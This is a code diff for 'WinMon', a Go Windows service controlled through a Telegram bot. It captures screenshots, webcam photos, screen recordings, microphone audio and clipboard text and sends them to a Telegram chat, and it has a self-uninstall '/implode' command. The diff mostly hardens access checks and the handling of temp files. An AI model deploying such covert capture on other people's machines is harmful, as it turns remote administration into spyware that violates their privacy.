@@ -40,6 +40,10 @@ func NewBotCoordinator(cfg *config.Config, stopChan chan struct{}) *BotCoordinat
 }
 
 func (b *BotCoordinator) Start() {
+	if len(b.cfg.AllowedUsers) == 0 {
+		log.Println("⚠️ WARNING: allowed_users is empty in configuration! ALL incoming Telegram requests will be DENIED by default for security.")
+	}
+
 	bot, err := tgbotapi.NewBotAPI(b.cfg.BotToken)
 	if err != nil {
 		log.Fatalf("Failed to create Telegram bot session: %v", err)
@@ -74,7 +78,7 @@ func (b *BotCoordinator) Start() {
 
 func (b *BotCoordinator) isAuthorized(userID int64, username string) bool {
 	if len(b.cfg.AllowedUsers) == 0 {
-		return true
+		return false
 	}
 	idStr := strconv.FormatInt(userID, 10)
 	for _, allowed := range b.cfg.AllowedUsers {
@@ -252,13 +256,17 @@ func (b *BotCoordinator) processCommand(cmd string, args []string, chatID int64)
 	case "/restartservice":
 		b.sendText(chatID, "🔄 Restarting WinMon service...")
 		if service.IsRunningAsService() {
-			_ = service.StartService("WinMon")
+			if err := service.StartService("WinMon"); err != nil {
+				log.Printf("Failed to restart WinMon service: %v", err)
+			}
 		}
 
 	case "/shutdownservice":
 		b.sendText(chatID, "🛑 Stopping WinMon service/process...")
 		if service.IsRunningAsService() {
-			_ = service.StopService("WinMon")
+			if err := service.StopService("WinMon"); err != nil {
+				log.Printf("Failed to stop WinMon service: %v", err)
+			}
 		} else {
 			go func() {
 				time.Sleep(1 * time.Second)
@@ -269,7 +277,9 @@ func (b *BotCoordinator) processCommand(cmd string, args []string, chatID int64)
 	case "/implode":
 		b.sendText(chatID, "💥 Uninstalling WinMon service and self-destructing...")
 		if service.IsRunningAsService() {
-			_ = service.UninstallService("WinMon")
+			if err := service.UninstallService("WinMon"); err != nil {
+				log.Printf("Failed to uninstall WinMon service: %v", err)
+			}
 		}
 		go func() {
 			time.Sleep(2 * time.Second)
@@ -285,12 +295,28 @@ func (b *BotCoordinator) executeCommandLocallyOrIPC(cmd string, args []string, c
 	start := time.Now()
 	flatArgs := strings.Join(args, " ")
 
+	var customTempPath string
+	ts := time.Now().UnixNano()
+	switch cmd {
+	case "/screenshot":
+		customTempPath = filepath.Join(service.GetSharedTempDir(), fmt.Sprintf("helper_screenshot_%d.jpg", ts))
+	case "/webcam":
+		customTempPath = filepath.Join(service.GetSharedTempDir(), fmt.Sprintf("helper_webcam_%d.jpg", ts))
+	case "/screenrecord":
+		customTempPath = filepath.Join(service.GetSharedTempDir(), fmt.Sprintf("helper_record_%d.gif", ts))
+	case "/listen":
+		customTempPath = filepath.Join(service.GetSharedTempDir(), fmt.Sprintf("helper_audio_%d.wav", ts))
+	case "/clipboard":
+		customTempPath = filepath.Join(service.GetSharedTempDir(), fmt.Sprintf("helper_clipboard_%d.txt", ts))
+	}
+
 	if service.IsRunningAsService() {
 		// Route via Session 1 IPC Agent
 		resp, err := service.SendIPCCommand(service.IPCRequest{
-			Cmd:      cmd,
-			Args:     args,
-			FlatArgs: flatArgs,
+			Cmd:        cmd,
+			Args:       args,
+			FlatArgs:   flatArgs,
+			OutputFile: customTempPath,
 		}, 60*time.Second)
 		if err != nil {
 			b.sendText(chatID, fmt.Sprintf("🔴 Session Agent IPC Error: %v", err))
@@ -300,17 +326,17 @@ func (b *BotCoordinator) executeCommandLocallyOrIPC(cmd string, args []string, c
 			b.sendText(chatID, fmt.Sprintf("🔴 IPC Command Error: %s", resp.Error))
 			return
 		}
-		b.handleHelperOutputTelegram(cmd, chatID, start)
+		b.handleHelperOutputTelegram(cmd, chatID, start, customTempPath)
 		return
 	}
 
 	// Console mode / Local service execution
-	err := RunSessionHelper(cmd, flatArgs)
+	err := RunSessionHelper(cmd, flatArgs, customTempPath)
 	if err != nil {
 		b.sendText(chatID, fmt.Sprintf("🔴 Command Error: %v", err))
 		return
 	}
-	b.handleHelperOutputTelegram(cmd, chatID, start)
+	b.handleHelperOutputTelegram(cmd, chatID, start, customTempPath)
 }
 
 func (b *BotCoordinator) executeNativeTelegram(cmd string, args []string, chatID int64, start time.Time) {
@@ -451,12 +477,14 @@ func (b *BotCoordinator) executeNativeTelegram(cmd string, args []string, chatID
 	}
 }
 
-func (b *BotCoordinator) handleHelperOutputTelegram(cmd string, chatID int64, start time.Time) {
+func (b *BotCoordinator) handleHelperOutputTelegram(cmd string, chatID int64, start time.Time, tempPath string) {
 	dur := fmt.Sprintf("(%d ms)", time.Since(start).Milliseconds())
 
 	switch cmd {
 	case "/screenshot":
-		tempPath := filepath.Join(service.GetSharedTempDir(), "helper_screenshot.jpg")
+		if tempPath == "" {
+			tempPath = filepath.Join(service.GetSharedTempDir(), "helper_screenshot.jpg")
+		}
 		if _, err := os.Stat(tempPath); err == nil {
 			b.sendPhoto(chatID, tempPath, "📸 **Desktop Screenshot** "+dur)
 			os.Remove(tempPath)
@@ -464,7 +492,9 @@ func (b *BotCoordinator) handleHelperOutputTelegram(cmd string, chatID int64, st
 			b.sendText(chatID, "🔴 Failed to retrieve screenshot from session agent.")
 		}
 	case "/webcam":
-		tempPath := filepath.Join(service.GetSharedTempDir(), "helper_webcam.jpg")
+		if tempPath == "" {
+			tempPath = filepath.Join(service.GetSharedTempDir(), "helper_webcam.jpg")
+		}
 		if _, err := os.Stat(tempPath); err == nil {
 			b.sendPhoto(chatID, tempPath, "📹 **Webcam Photo** "+dur)
 			os.Remove(tempPath)
@@ -472,7 +502,9 @@ func (b *BotCoordinator) handleHelperOutputTelegram(cmd string, chatID int64, st
 			b.sendText(chatID, "🔴 Failed to retrieve webcam photo from session agent.")
 		}
 	case "/screenrecord":
-		tempPath := filepath.Join(service.GetSharedTempDir(), "helper_record.gif")
+		if tempPath == "" {
+			tempPath = filepath.Join(service.GetSharedTempDir(), "helper_record.gif")
+		}
 		if _, err := os.Stat(tempPath); err == nil {
 			b.sendAnimation(chatID, tempPath, "🎥 **Screen Recording GIF** "+dur)
 			os.Remove(tempPath)
@@ -480,7 +512,9 @@ func (b *BotCoordinator) handleHelperOutputTelegram(cmd string, chatID int64, st
 			b.sendText(chatID, "🔴 Failed to retrieve screen recording from session agent.")
 		}
 	case "/listen":
-		tempPath := filepath.Join(service.GetSharedTempDir(), "helper_audio.wav")
+		if tempPath == "" {
+			tempPath = filepath.Join(service.GetSharedTempDir(), "helper_audio.wav")
+		}
 		if _, err := os.Stat(tempPath); err == nil {
 			b.sendVoice(chatID, tempPath, "🎙️ **Microphone Audio Voice Note** "+dur)
 			os.Remove(tempPath)
@@ -488,7 +522,9 @@ func (b *BotCoordinator) handleHelperOutputTelegram(cmd string, chatID int64, st
 			b.sendText(chatID, "🔴 Failed to retrieve audio recording from session agent.")
 		}
 	case "/clipboard":
-		tempPath := filepath.Join(service.GetSharedTempDir(), "helper_clipboard.txt")
+		if tempPath == "" {
+			tempPath = filepath.Join(service.GetSharedTempDir(), "helper_clipboard.txt")
+		}
 		if data, err := os.ReadFile(tempPath); err == nil {
 			b.sendText(chatID, fmt.Sprintf("📋 **Clipboard Content:**\n```\n%s\n```", string(data)))
 			os.Remove(tempPath)
@@ -609,28 +645,40 @@ func (b *BotCoordinator) handleAttachmentUpload(msg *tgbotapi.Message, destinati
 
 func (b *BotCoordinator) handleSetWallpaperAttachment(msg *tgbotapi.Message) {
 	chatID := msg.Chat.ID
-	tempPath := filepath.Join(service.GetSharedTempDir(), "winmon_wall_temp.jpg")
+	tempPath := filepath.Join(service.GetSharedTempDir(), fmt.Sprintf("winmon_wall_%d.jpg", time.Now().UnixNano()))
 	b.handleAttachmentUpload(msg, tempPath)
 	b.executeCommandLocallyOrIPC("/setwallpaper", []string{tempPath}, chatID)
 	_ = os.Remove(tempPath)
 }
 
 // Session helper commands (executed inside user desktop session)
-func RunSessionHelper(cmd string, args string) error {
+func RunSessionHelper(cmd string, args string, outputFile string) error {
 	switch cmd {
 	case "/screenshot":
-		tempPath := filepath.Join(service.GetSharedTempDir(), "helper_screenshot.jpg")
+		tempPath := outputFile
+		if tempPath == "" {
+			tempPath = filepath.Join(service.GetSharedTempDir(), "helper_screenshot.jpg")
+		}
 		return media.CaptureScreen(tempPath)
 	case "/webcam":
-		tempPath := filepath.Join(service.GetSharedTempDir(), "helper_webcam.jpg")
+		tempPath := outputFile
+		if tempPath == "" {
+			tempPath = filepath.Join(service.GetSharedTempDir(), "helper_webcam.jpg")
+		}
 		return media.CaptureWebcam(tempPath)
 	case "/screenrecord":
 		dur := parseDuration(args)
-		tempPath := filepath.Join(service.GetSharedTempDir(), "helper_record.gif")
+		tempPath := outputFile
+		if tempPath == "" {
+			tempPath = filepath.Join(service.GetSharedTempDir(), "helper_record.gif")
+		}
 		return media.RecordScreen(dur, tempPath)
 	case "/listen":
 		dur := parseDuration(args)
-		tempPath := filepath.Join(service.GetSharedTempDir(), "helper_audio.wav")
+		tempPath := outputFile
+		if tempPath == "" {
+			tempPath = filepath.Join(service.GetSharedTempDir(), "helper_audio.wav")
+		}
 		return media.RecordAudio(dur, tempPath)
 	case "/setwallpaper":
 		return display.SetWallpaperLocal(args)
@@ -644,7 +692,10 @@ func RunSessionHelper(cmd string, args string) error {
 		}
 		return notifications.ShowToastLocal(title, msg)
 	case "/clipboard":
-		tempPath := filepath.Join(service.GetSharedTempDir(), "helper_clipboard.txt")
+		tempPath := outputFile
+		if tempPath == "" {
+			tempPath = filepath.Join(service.GetSharedTempDir(), "helper_clipboard.txt")
+		}
 		txt, err := clipboard.GetClipboardLocal()
 		if err != nil {
 			return err
@@ -675,7 +726,7 @@ func parseDuration(arg string) time.Duration {
 func RunSessionAgentLoop() error {
 	log.Println("Starting WinMon Persistent Session Agent (Session 1 IPC Listener)...")
 	return service.StartIPCAgentServer(func(req service.IPCRequest) service.IPCResponse {
-		err := RunSessionHelper(req.Cmd, req.FlatArgs)
+		err := RunSessionHelper(req.Cmd, req.FlatArgs, req.OutputFile)
 		if err != nil {
 			return service.IPCResponse{
 				Success: false,
@@ -683,7 +734,8 @@ func RunSessionAgentLoop() error {
 			}
 		}
 		return service.IPCResponse{
-			Success: true,
+			Success:    true,
+			OutputFile: req.OutputFile,
 		}
 	})
 }
